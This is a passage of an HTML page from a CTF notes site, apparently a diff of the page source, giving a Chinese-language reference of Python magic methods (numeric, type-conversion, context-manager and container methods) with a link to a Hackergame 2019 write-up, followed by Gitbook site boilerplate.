+__pos__(self)    &#x5B9A;&#x4E49;&#x6B63;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;+x
+__neg__(self)    &#x5B9A;&#x4E49;&#x8D1F;&#x53F7;&#x7684;&#x884C;&#x4E3A;&#xFF1A;-x
+__abs__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; abs() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__invert__(self)    &#x5B9A;&#x4E49;&#x6309;&#x4F4D;&#x6C42;&#x53CD;&#x7684;&#x884C;&#x4E3A;&#xFF1A;~x
+ &#x7C7B;&#x578B;&#x8F6C;&#x6362;
+__complex__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; complex() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF08;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x6070;&#x5F53;&#x7684;&#x503C;&#xFF09;
+__int__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; int() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF08;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x6070;&#x5F53;&#x7684;&#x503C;&#xFF09;
+__float__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; float() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF08;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x6070;&#x5F53;&#x7684;&#x503C;&#xFF09;
+__round__(self[, n])    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; round() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF08;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x6070;&#x5F53;&#x7684;&#x503C;&#xFF09;
+__index__(self)    <span class="hljs-number">1.</span> &#x5F53;&#x5BF9;&#x8C61;&#x662F;&#x88AB;&#x5E94;&#x7528;&#x5728;&#x5207;&#x7247;&#x8868;&#x8FBE;&#x5F0F;&#x4E2D;&#x65F6;&#xFF0C;&#x5B9E;&#x73B0;&#x6574;&#x5F62;&#x5F3A;&#x5236;&#x8F6C;&#x6362;
+<span class="hljs-number">2.</span> &#x5982;&#x679C;&#x4F60;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x5728;&#x5207;&#x7247;&#x65F6;&#x7528;&#x5230;&#x7684;&#x5B9A;&#x5236;&#x7684;&#x6570;&#x503C;&#x578B;,&#x4F60;&#x5E94;&#x8BE5;&#x5B9A;&#x4E49; __index__
+<span class="hljs-number">3.</span> &#x5982;&#x679C; __index__ &#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5219; __int__ &#x4E5F;&#x9700;&#x8981;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x4E14;&#x8FD4;&#x56DE;&#x76F8;&#x540C;&#x7684;&#x503C;
+
+&#x4E0A;&#x4E0B;&#x6587;&#x7BA1;&#x7406;&#xFF08;<span class="hljs-keyword">with</span> &#x8BED;&#x53E5;&#xFF09;
+__enter__(self)    <span class="hljs-number">1.</span> &#x5B9A;&#x4E49;&#x5F53;&#x4F7F;&#x7528; <span class="hljs-keyword">with</span> &#x8BED;&#x53E5;&#x65F6;&#x7684;&#x521D;&#x59CB;&#x5316;&#x884C;&#x4E3A;
+<span class="hljs-number">2.</span> __enter__ &#x7684;&#x8FD4;&#x56DE;&#x503C;&#x88AB; <span class="hljs-keyword">with</span> &#x8BED;&#x53E5;&#x7684;&#x76EE;&#x6807;&#x6216;&#x8005; <span class="hljs-keyword">as</span> &#x540E;&#x7684;&#x540D;&#x5B57;&#x7ED1;&#x5B9A;
+__exit__(self, exc_type, exc_value, traceback)    <span class="hljs-number">1.</span> &#x5B9A;&#x4E49;&#x5F53;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x88AB;&#x6267;&#x884C;&#x6216;&#x8005;&#x7EC8;&#x6B62;&#x540E;&#x4E0A;&#x4E0B;&#x6587;&#x7BA1;&#x7406;&#x5668;&#x5E94;&#x8BE5;&#x505A;&#x4EC0;&#x4E48;
+<span class="hljs-number">2.</span> &#x4E00;&#x822C;&#x88AB;&#x7528;&#x6765;&#x5904;&#x7406;&#x5F02;&#x5E38;&#xFF0C;&#x6E05;&#x9664;&#x5DE5;&#x4F5C;&#x6216;&#x8005;&#x505A;&#x4E00;&#x4E9B;&#x4EE3;&#x7801;&#x5757;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5E38;&#x5DE5;&#x4F5C;
+ &#x5BB9;&#x5668;&#x7C7B;&#x578B;
+__len__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; len() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF08;&#x8FD4;&#x56DE;&#x5BB9;&#x5668;&#x4E2D;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF09;
+__getitem__(self, key)    &#x5B9A;&#x4E49;&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x4E2D;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E; self[key]
+__setitem__(self, key, value)    &#x5B9A;&#x4E49;&#x8BBE;&#x7F6E;&#x5BB9;&#x5668;&#x4E2D;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E; self[key] = value
+__delitem__(self, key)    &#x5B9A;&#x4E49;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x4E2D;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E; <span class="hljs-keyword">del</span> self[key]
+__iter__(self)
+__next__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x8FED;&#x4EE3;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x7684;&#x884C;&#x4E3A;
+__reversed__(self)    &#x5B9A;&#x4E49;&#x5F53;&#x88AB; reversed() &#x8C03;&#x7528;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+__contains__(self, item)    &#x5B9A;&#x4E49;&#x5F53;&#x4F7F;&#x7528;&#x6210;&#x5458;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;&#xFF08;<span class="hljs-keyword">in</span> &#x6216; <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>&#xFF09;&#x65F6;&#x7684;&#x884C;&#x4E3A;
+</code></pre>
+<h2 id="&#x7279;&#x6B8A;&#x5C5E;&#x6027;"><a name="&#x7279;&#x6B8A;&#x5C5E;&#x6027;" class="anchor-navigation-ex-anchor" href="#&#x7279;&#x6B8A;&#x5C5E;&#x6027;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7279;&#x6B8A;&#x5C5E;&#x6027;</h2>
+<p><code>foo.func_code</code>
+<code>foo.func_globals</code></p>
+<h2 id="&#x62D3;&#x5C55;&#x8D44;&#x6599;"><a name="&#x62D3;&#x5C55;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x62D3;&#x5C55;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x62D3;&#x5C55;&#x8D44;&#x6599;</h2>
+<p>Hackergame2019 &#x4E0D;&#x540C;&#x5BFB;&#x5E38;&#x7684; Python &#x8003;&#x8BD5; &#xFF1A;
+<a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md" target="_blank">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md</a> </p>
+<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
+2021-05-07 16:30:35
+</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="js.html" class="navigation navigation-prev " aria-label="Previous page: JavaScript">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="bash.html" class="navigation navigation-next " aria-label="Next page: BASH">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Python","level":"1.2.13","depth":2,"next":{"title":"BASH","level":"1.2.14","depth":2,"path":"library/bash.md","ref":"library/bash.md","articles":[]},"previous":{"title":"JavaScript","level":"1.2.12","depth":2,"path":"library/js.md","ref":"library/js.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"library/python.md","mtime":"2021-05-07T08:30:35.937Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
